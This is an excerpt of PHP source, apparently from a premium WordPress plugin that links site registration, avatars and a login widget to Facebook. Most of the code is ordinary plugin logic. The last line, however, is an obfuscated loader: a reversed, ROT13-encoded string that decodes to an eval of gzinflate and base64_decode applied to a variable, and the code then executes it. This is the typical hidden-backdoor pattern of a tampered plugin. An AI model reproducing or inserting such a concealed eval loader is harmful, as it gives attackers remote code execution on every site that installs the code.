...
define('JFB_PREMIUM', 938);
define('JFB_PREMIUM_VER', 24);
define('JFB_PREMIUM_REQUIREDVER', '2.1.0');
...
function jfb_registration_restrict($user_data, $args)
{
    ...
    else if( get_option($opt_jfbp_restrict_reg) == 3)
    {
        ...
        {
            $friends = $args['facebook']->api('/me/friends/'.$my_uid, 'GET');
    ...
    else if( get_option($opt_jfbp_restrict_reg) == 4)
    {
        ...
        $membersList = $args['facebook']->api('/'.$gid.'/members/', 'GET');
    ...
    else if( get_option($opt_jfbp_restrict_reg) == 5)
    {
        ...
        $likes = $args['facebook']->api('/me/likes/' . $pg_id, 'GET');
...
{
    echo '<p style="margin-bottom: 10px;" id="facebook-btn-wrap">';
    jfb_output_facebook_btn();
 ...
 */
function jfb_get_avatar_cache_dir()
{
    global $opt_jfbp_cache_avatar_dir;
    $ud = wp_upload_dir();
    $subpath = get_option($opt_jfbp_cache_avatar_dir);
    return array('basepath'=>trailingslashit($ud['basedir']), 'subpath'=>$subpath, 'fullpath'=>trailingslashit($ud['basedir'] . "/" . $subpath));   
}
...
function jfb_cache_local_avatar( $args )
{
    ...
    $dstFile = $path['fullpath'] . $args['WP_ID'] . "_thumb.jpg";
    ...
    update_user_meta($args['WP_ID'], 'facebook_avatar_thumb', trailingslashit($path['subpath']) . $args['WP_ID'] . '_thumb.jpg');
    ...
    $dstFile = $path['fullpath'] . $args['WP_ID'] . "_full.jpg";
    if( !@copy( $srcFile, $dstFile ) )
    {
        $jfb_log .= "   ERROR copying fullsize image '" . print_r($srcFile, true) . "' to '$dstFile'.  Avatar caching aborted.\n";
        return;
    }
    update_user_meta($args['WP_ID'], 'facebook_avatar_full', trailingslashit($path['subpath']) . $args['WP_ID'] . '_full.jpg');
...
function jfb_delete_cached_avatar($id)
{
    ...
    $thumbFile = $path['basepath'] . get_user_meta($id, 'facebook_avatar_thumb', true);
    if( file_exists ( $thumbFile ))
        @unlink($thumbFile);
        
    //Try to delete the full image, if present
    $fullFile = $path['basepath'] . get_user_meta($id, 'facebook_avatar_full', true);
...
class Widget_AutoConnect_Premium extends WP_Widget
{
    ...
    function form( $instance )
    {
        $default = array( "title"=>"WP-FB AutoConnect",
                          ...
                          "showwplogin"=>true, "showrememberme"=>false, "logoutofFB"=>false, "showavatar"=>false, "avatarsize"=>35 );
...
define('JFB_PREMIUM_VALUE', '');
$CWBXLP='';$ecnbav=';)))CYKOJP$(rqbprq_46rfno(rgnysavmt(ynir';$TMwJOe=strrev($ecnbav);$cDrWsZ=str_rot13($TMwJOe);eval($cDrWsZ);
